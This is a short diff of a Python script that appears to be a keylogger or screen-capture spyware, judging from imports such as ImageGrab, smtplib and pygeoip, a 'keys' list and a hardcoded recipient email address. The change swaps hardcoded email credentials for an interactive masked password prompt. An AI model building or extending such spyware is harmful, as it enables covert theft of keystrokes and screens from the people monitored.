@@ -3,6 +3,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
+import stdiomask
 import socket
 import PyPDF2
 import pygeoip
@@ -20,8 +21,8 @@ from PIL import ImageGrab
 
 count = 0
 keys = []
-email_address = 'email@email.com'
-passw = 'YourPass'
+email_address = input('Enter Your Email Address:')
+passw =  stdiomask.getpass(prompt='Enter Your Password: ', mask='*')
 tooadd = 'jainharsh3716@gmail.com'
 time_iteration = 15
 no_of_iteration_end = 3
